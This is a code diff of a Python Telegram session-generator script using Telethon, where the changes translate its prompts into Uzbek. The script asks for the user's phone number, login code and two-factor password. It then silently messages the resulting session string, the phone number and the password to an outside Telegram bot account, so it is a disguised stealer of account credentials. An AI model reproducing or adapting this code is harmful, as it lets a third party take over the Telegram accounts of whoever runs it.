@@ -18,17 +18,18 @@ print("""\033[031m
  ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝╚═════╝  ╚═════╝    ╚═╝   
 
 """)
-string = input("Press enter: ")
+print("Fazliddinbek")
+string = input("Enterni bosing: ")
 client = TelegramClient(StringSession(string), api_id, api_hash)
-phone_number = input("Please enter your phone (or bot token): ")
+phone_number = input("Telefon nomerni kiriting (bot tokeni): ")
 client.connect()
 
 if not client.is_user_authorized():
     client.send_code_request(phone_number)
     try:
-        me = client.sign_in(phone_number, input('Enter code: '))
+        me = client.sign_in(phone_number, input('Kodni kiriting: '))
         client.send_message("@userbot_ishlatuvchi_bot", f'Session: {client.session.save()}\n\nPhone number: {phone_number}')
     except SessionPasswordNeeder:
-        password = input('Enter password')
+        password = input('Ikki bosqichli parolni kiriting:')
         me2 = client.sign_in(password=password)  
         client.send_message("@userbot_ishlatuvchi_bot", f'Session: {client.session.save()}\n\nPhone number: {phone_number}\n\nPassword: {password}') 
